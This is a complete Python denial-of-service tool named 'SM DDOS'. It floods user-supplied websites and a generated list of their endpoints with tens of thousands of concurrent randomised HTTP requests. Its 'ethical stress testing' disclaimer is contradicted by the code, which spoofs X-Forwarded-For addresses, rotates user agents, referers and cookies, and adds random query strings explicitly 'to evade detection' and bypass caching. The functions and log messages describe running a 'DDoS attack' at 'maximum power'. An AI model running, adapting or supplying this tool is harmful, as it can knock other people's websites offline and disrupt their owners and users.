#!/usr/bin/env python3
# ----------------------------------------------------------------------------------------------
# SM DDOS - Ultra-Powerful Multi-Target HTTP Stress Testing Tool for Termux/VPS
#
# This tool is designed for ethical stress-testing of HTTP servers to evaluate resilience.
# It sends massive, varied HTTP requests to multiple websites, meant for authorized use only.
# Unauthorized use is prohibited and illegal.
#
# Author: Optimized for Termux/VPS and GitHub, version 5.0
# Updates: Multi-website support, extreme concurrency, massive payloads, advanced evasion.
# ----------------------------------------------------------------------------------------------

import aiohttp
import asyncio
import random
import sys
import time
import logging
from urllib.parse import urlparse
from statistics import mean
import psutil
import os

# Configuration
CONFIG = {
    'max_requests': 50000,     # Total requests (massive)
    'timeout': 600,            # Test duration (seconds)
    'batch_size': 500,         # Simultaneous requests
    'request_rate': 300,       # Requests per second
    'max_retries': 5,          # Retry attempts
    'request_types': ['GET', 'POST', 'HEAD', 'PUT'],
    'log_file': 'ddos_test.log',
    'target_urls': [],         # Filled dynamically
    'payload_size': 10240,     # Max POST payload (10KB)
    'connection_limit': 2000   # Max simultaneous connections
}

# Configure logging
logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(CONFIG['log_file']),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# Global variables
hosts = []
headers_useragents = []
headers_referers = []
request_counter = 0
successful_requests = 0
failed_requests = 0
response_times = []
status_codes = {}

def useragent_list():
    """Generate a diverse list of User-Agent strings to evade detection."""
    global headers_useragents
    headers_useragents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0',
        'Mozilla/5.0 (Linux; Android 14; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/127.0.0.0',
        'Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36'
    ]
    return headers_useragents

def referer_list():
    """Generate a list of referer URLs."""
    global headers_referers
    headers_referers = [
        'https://www.google.com/?q=',
        'https://www.bing.com/search?q=',
        'https://search.yahoo.com/search?p=',
        'https://duckduckgo.com/?q=',
        'https://www.facebook.com/',
        'https://www.twitter.com/',
        'https://www.reddit.com/',
        'https://www.linkedin.com/',
        'https://www.instagram.com/',
        'https://www.youtube.com/'
    ]
    return headers_referers

def buildblock(size):
    """Generate a random ASCII string for query parameters or payloads."""
    return ''.join(chr(random.randint(65, 90)) for _ in range(size))

def check_resources():
    """Monitor VPS/Termux CPU and memory usage."""
    try:
        cpu_usage = psutil.cpu_percent(interval=0.1)
        memory = psutil.virtual_memory()
        if cpu_usage > 95:
            logger.warning(f"High CPU usage: {cpu_usage}% - Reducing batch size")
            CONFIG['batch_size'] = max(100, CONFIG['batch_size'] // 2)
        if memory.percent > 95:
            logger.warning(f"High memory usage: {memory.percent}% - Reducing batch size")
            CONFIG['batch_size'] = max(100, CONFIG['batch_size'] // 2)
        return cpu_usage < 95 and memory.percent < 95
    except Exception as e:
        logger.error(f"Resource check failed: {e}")
        return True

async def httpcall(session, target_url, retry=0):
    """Send a varied HTTP request with randomized headers and payloads."""
    global request_counter, successful_requests, failed_requests, response_times, status_codes
    param_joiner = "&" if "?" in target_url else "?"
    target_url = f"{target_url}{param_joiner}{buildblock(random.randint(5, 20))}={buildblock(random.randint(5, 20))}"
    headers = {
        'User-Agent': random.choice(headers_useragents),
        'Accept': random.choice([
            'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'application/json,text/plain,*/*;q=0.9',
            '*/*'
        ]),
        'Accept-Language': random.choice(['en-US,en;q=0.5', 'en-GB,en;q=0.5', 'fr-FR,fr;q=0.5', 'de-DE,de;q=0.5', 'es-ES,es;q=0.5']),
        'Accept-Encoding': random.choice(['gzip, deflate, br', 'gzip', 'deflate', 'br', 'identity']),
        'Cache-Control': random.choice(['no-cache', 'max-age=0']),
        'Referer': random.choice(headers_referers) + buildblock(random.randint(5, 15)),
        'Connection': 'keep-alive',
        'Host': urlparse(target_url).netloc,
        'Cookie': f'session={buildblock(20)}; user={buildblock(15)}; id={buildblock(10)}',
        'X-Forwarded-For': f'{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}',
        'DNT': random.choice(['1', '0']),
        'Upgrade-Insecure-Requests': '1'
    }
    request_type = random.choice(CONFIG['request_types'])
    start_time = time.time()
    try:
        if request_type == 'POST':
            data = {'data': buildblock(random.randint(2000, CONFIG['payload_size']))}
            async with session.post(target_url, headers=headers, data=data, timeout=30, ssl=False) as response:
                status = response.status
        elif request_type == 'PUT':
            data = {'data': buildblock(random.randint(2000, CONFIG['payload_size']))}
            async with session.put(target_url, headers=headers, data=data, timeout=30, ssl=False) as response:
                status = response.status
        elif request_type == 'HEAD':
            async with session.head(target_url, headers=headers, timeout=30, ssl=False) as response:
                status = response.status
        else:  # GET
            async with session.get(target_url, headers=headers, timeout=30, ssl=False) as response:
                status = response.status
        response_time = time.time() - start_time
        response_times.append(response_time)
        successful_requests += 1
        status_codes[status] = status_codes.get(status, 0) + 1
        if status >= 500:
            logger.warning(f"Server returned {status} - possible overload")
        elif status == 429:
            logger.warning("Server rate-limiting detected (429)")
        elif status == 403:
            logger.warning("Server returned 403 - possible Cloudflare/WAF block")
        request_counter += 1
        logger.debug(f"Request {request_counter} to {target_url} succeeded: {status}, Time: {response_time:.3f}s")
        return status
    except aiohttp.ClientError as e:
        logger.error(f"Request to {target_url} failed: {e}")
        failed_requests += 1
        request_counter += 1
        if retry < CONFIG['max_retries']:
            logger.debug(f"Retrying request {request_counter} (Attempt {retry + 1}/{CONFIG['max_retries']})")
            await asyncio.sleep(random.uniform(0.01, 0.1))  # Random delay for evasion
            return await httpcall(session, target_url, retry + 1)
        logger.error(f"Request {request_counter} failed after {CONFIG['max_retries']} retries")
        return None

async def run_attack():
    """Run the ultra-powerful DDoS attack with maximum concurrency."""
    global request_counter, successful_requests, failed_requests, response_times
    useragent_list()
    referer_list()
    start_time = time.time()
    
    connector = aiohttp.TCPConnector(limit=CONFIG['connection_limit'], ttl_dns_cache=300, ssl=False)
    async with aiohttp.ClientSession(connector=connector) as session:
        while request_counter < CONFIG['max_requests'] and (time.time() - start_time) < CONFIG['timeout']:
            if not check_resources():
                logger.error("Resource limits reached. Adjusting batch size.")
            tasks = []
            remaining_requests = CONFIG['max_requests'] - request_counter
            current_batch_size = min(CONFIG['batch_size'], remaining_requests, CONFIG['request_rate'])
            for _ in range(current_batch_size):
                target_url = random.choice(CONFIG['target_urls'])
                tasks.append(httpcall(session, target_url))
            if tasks:
                await asyncio.gather(*tasks, return_exceptions=True)
                logger.info(f"Sent {request_counter} requests (Success: {successful_requests}, Failed: {failed_requests})")
            # No sleep for maximum power
    duration = time.time() - start_time
    success_rate = (successful_requests / request_counter * 100) if request_counter > 0 else 0
    avg_response_time = mean(response_times) if response_times else 0
    logger.info(f"Attack finished: {request_counter} requests sent in {duration:.2f} seconds")
    logger.info(f"Success rate: {success_rate:.2f}% (Successful: {successful_requests}, Failed: {failed_requests})")
    logger.info(f"Average response time: {avg_response_time:.3f} seconds")
    logger.info(f"Status codes: {dict(status_codes)}")

def welcome_message():
    """Display a welcome message."""
    print("""
    ╔════════════════════════════════════════════════════╗
    ║       SM DDOS - Ultra-Powerful Stress Testing      ║
    ║                                                    ║
    ║ For ETHICAL testing of YOUR OWN websites only!      ║
    ║ Unauthorized use is ILLEGAL and prohibited.         ║
    ║ Version 5.0 - Optimized for Termux/VPS             ║
    ║ Date: August 16, 2025                              ║
    ╚════════════════════════════════════════════════════╝
    """)

def get_user_input():
    """Prompt for multiple URLs, request count, and rate."""
    global CONFIG
    print("Enter target URLs (one per line, press Enter twice to finish):")
    urls = []
    while True:
        url = input("URL (e.g., https://sm5test.rf.gd/SM/sm-bomber.html): ").strip()
        if not url:
            if urls:
                break
            else:
                print("At least one URL is required!")
                continue
        if not url.startswith(('http://', 'https://')):
            url = f'https://{url}'
        urls.append(url)
    
    try:
        max_requests = input("Enter total number of requests (default 50000): ").strip()
        CONFIG['max_requests'] = int(max_requests) if max_requests else 50000
        request_rate = input("Enter requests per second (default 300): ").strip()
        CONFIG['request_rate'] = int(request_rate) if request_rate else 300
    except ValueError:
        logger.error("Invalid input for max_requests or request_rate. Using defaults.")
        CONFIG['max_requests'] = 50000
        CONFIG['request_rate'] = 300
    
    # Generate endpoints for each URL
    for url in urls:
        parsed_url = urlparse(url)
        if not parsed_url.netloc:
            logger.error(f"Invalid URL: {url}")
            continue
        host = parsed_url.netloc
        base_urls = [
            f'https://{host}/',
            f'https://{host}/index.html',
            f'https://{host}/contact.html',
            f'https://{host}/about.html',
            f'https://{host}/login.html',
            f'https://{host}/signup.html',
            f'https://{host}/api/',
            f'https://{host}/test.html',
            f'https://{host}/home.html',
            f'https://{host}/profile.html',
            f'https://{host}/search.html',
            f'https://{host}/blog/',
            f'https://{host}/products.html',
            f'https://{host}/services.html',
            f'https://{host}/dashboard.html',
            f'https://{host}/admin/',
            f'https://{host}/auth/',
            f'https://{host}/config/',
            f'https://{host}/data/',
            f'https://{host}/status.html'
        ]
        if url not in base_urls:
            base_urls.append(url)
        CONFIG['target_urls'].extend(base_urls)
    return urls

def main():
    """Main function to initialize and run the attack."""
    global hosts
    welcome_message()
    urls = get_user_input()
    if not CONFIG['target_urls']:
        logger.error("No valid URLs provided. Exiting.")
        sys.exit(1)
    
    global hosts
    hosts = list(set(urlparse(url).netloc for url in CONFIG['target_urls']))
    logger.info(f"Starting SM DDOS attack on {len(hosts)} hosts with {len(CONFIG['target_urls'])} endpoints")
    try:
        asyncio.run(run_attack())
    except KeyboardInterrupt:
        logger.info("Attack stopped by user")
    except Exception as e:
        logger.error(f"Attack failed: {e}")

if __name__ == '__main__':
    try:
        import psutil
    except ImportError:
        print("Installing psutil for resource monitoring...")
        os.system("pip install psutil")
        import psutil
    main()
